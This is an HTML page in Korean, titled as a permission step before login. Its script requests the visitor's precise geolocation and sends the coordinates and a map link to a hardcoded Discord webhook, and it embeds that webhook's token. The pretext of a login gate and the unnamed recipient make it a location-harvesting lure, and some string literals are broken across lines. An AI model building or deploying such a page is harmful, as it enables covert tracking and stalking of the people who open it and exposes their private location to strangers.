<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>로그인 전에 권한 허용</title>
  <style>
    * {
      box-sizing: border-box;
    }

    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      min-height: 100%;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #111;
    }

    .container {
      width: min(92vw, 420px);
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25);
      padding: 28px 22px;
      text-align: center;
    }

    h1 {
      margin: 0 0 8px;
      font-size: 24px;
      line-height: 1.2;
    }

    .sub {
      margin: 0 0 20px;
      color: #555;
      font-size: 14px;
      line-height: 1.5;
    }

    .btn {
      width: 100%;
      border: none;
      border-radius: 14px;
      padding: 16px 18px;
      font-size: 18px;
      font-weight: 700;
      color: #fff;
      background: #5865F2;
      cursor: pointer;
      -webkit-tap-highlight-color: transparent;
      touch-action: manipulation;
    }

    .btn:active {
      transform: translateY(1px);
    }

    .btn:disabled {
      opacity: 0.7;
      cursor: not-allowed;
    }

    .status {
      margin-top: 16px;
      font-size: 14px;
      color: #333;
      min-height: 20px;
      white-space: pre-wrap;
      word-break: keep-all;
      line-height: 1.5;
    }

    .small {
      margin-top: 14px;
      font-size: 12px;
      color: #777;
      line-height: 1.5;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>📍 권한 허용</h1>
    <p class="sub">버튼을 누르면 위치 권한을 요청하고, 허용되면 전송합니다.</p>

    <button id="locationBtn" class="btn" type="button">위치 권한 허용하기</button>

    <div id="status" class="status"></div>

    <div class="small">
      참고: 위치 API는 HTTPS 환경에서만 정상 동작합니다.
    </div>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ";

    const btn = document.getElementById("locationBtn");
    const statusEl = document.getElementById("status");

    function setStatus(text) {
      statusEl.textContent = text;
    }

    function getLocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error("브라우저가 위치 정보를 지원하지 않습니다."));
          return;
        }

        navigator.geolocation.getCurrentPosition(
          resolve,
          reject,
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      });
    }

    async function sendDiscord(message) {
      const formData = new FormData();
      formData.append("content", message);

      const res = await fetch(webhookUrl, {
        method: "POST",
        body: formData
      });

      if (!res.ok) {
        throw new Error("전송 실패");
      }
    }

    btn.addEventListener("click", async () => {
      try {
        btn.disabled = true;
        setStatus("위치 권한을 요청하는 중...");

        const position = await getLocation();
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const acc = position.coords.accuracy;

        const mapsLink = "https://maps.google.com/?q=" + lat + "," + lon;
        const message =
          "📍 위치 정보

" +
          "좌표: " + lat + ", " + lon + "
" +
          "정확도: " + acc + "m
" +
          "지도: " + mapsLink;

        setStatus("전송하는 중...");
        await sendDiscord(message);

        setStatus("전송 완료.");
        alert("✅ 위치 정보가 전송되었습니다!");
      } catch (error) {
        console.error(error);
        setStatus("오류 발생: " + error.message);
        alert("❌ " + error.message);
      } finally {
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
